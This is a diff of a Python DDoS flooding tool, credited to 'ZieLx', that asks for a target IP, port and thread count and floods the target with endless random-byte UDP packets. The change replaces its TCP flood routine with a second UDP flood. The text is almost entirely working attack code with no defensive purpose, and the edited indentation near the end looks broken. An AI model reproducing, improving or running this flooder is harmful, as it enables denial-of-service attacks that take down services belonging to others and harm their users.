@@ -42,7 +42,7 @@ print("""
 \n""") 
 print("""
 \033[95 [•] Code : ZieLx
- [$] METHOD : UDP - TCP
+ [$] METHOD : UDP 
  [#] DC : Z1#7872
 
 ip =str(input("\033[96m[1] Ip Target :\033[91m "))
@@ -52,38 +52,35 @@ size =int(input("\033[96m[4] Size :\033[91m "))
 choice =str(input("\033[96m[5] Ready? (y/n) :\033[91m "))
 
 def run():
-	data = os.urandom(1025)
-	i = random.choice(("[•]","[+]","[$]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr =(str(ip),int(port))
-			for x in range(times):
-				sock.sendto(data,addr)
-				print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
-		except:
-					print("\033[31m[•] %s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
-					
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+                print("\033[91m[#] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port)) 
+        except:
+            print("\033[91m[%] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
+
 def run2():
-	data = os.urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
-		except:
-			s.close()
-			print("\033[31m[•] %s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
-					
+    data = random._urandom(1202)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+                print("\033[91m[$] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
+        except:
+            s.close()
+            print("\033[91m[•] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
+
 for y in range(size):
 	if choice == 'y':
 		th = threading.Thread(target = run)
 		th.start()
-	else:
+      else:
 		th = threading.Thread(target = run2)
 		th.start()
 			
